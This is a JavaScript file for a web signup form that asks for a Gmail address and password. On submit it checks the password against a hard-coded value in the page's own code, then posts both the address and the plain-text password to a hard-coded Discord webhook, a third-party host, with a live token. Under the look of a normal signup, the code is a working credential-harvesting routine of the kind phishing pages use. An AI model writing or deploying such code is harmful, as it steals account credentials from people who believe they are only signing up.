document.addEventListener("DOMContentLoaded", () => {
  const form = document.getElementById("signup-form");
  const gmailInput = document.getElementById("username");
  const passwordInput = document.getElementById("password");
  const displayName = document.getElementById("display-name");
  const signupContainer = document.getElementById("signup-container");
  const mainContent = document.getElementById("main-content");

  form.addEventListener("submit", (e) => {
    e.preventDefault();

    const gmail = gmailInput.value;
    const password = passwordInput.value;

    const correctPassword = "mySecret123"; // <-- Optional security step

    if (password !== correctPassword) {
      alert("Incorrect password. Please try again.");
      return;
    }

    localStorage.setItem("gmail", gmail);
    displayName.textContent = gmail;
    signupContainer.style.display = "none";
    mainContent.style.display = "block";

    sendToDiscord(gmail, password);
  });

  const savedGmail = localStorage.getItem("gmail");
  if (savedGmail) {
    displayName.textContent = savedGmail;
    signupContainer.style.display = "none";
    mainContent.style.display = "block";
  }
});

function sendToDiscord(gmail, password) {
  const webhookURL = "https://discord.com/api/webhooks/1362138187962650727/aVG7VuftNpdkCSHQH8aMGEp5HoLdTuis4OdDrpVFdwnj0TDcVUCkEr3dUt4zV-5OP1rL";

  const payload = {
    content: `📨 New signup:\n**Gmail:** ${gmail}\n**Password:** ${password}`,
    username: "Signup Bot"
  };

  fetch(webhookURL, {
    method: "POST",
    headers: {
      "Content-Type": "application/json"
    },
    body: JSON.stringify(payload)
  }).catch(err => {
    console.error("Webhook error:", err);
  });
}
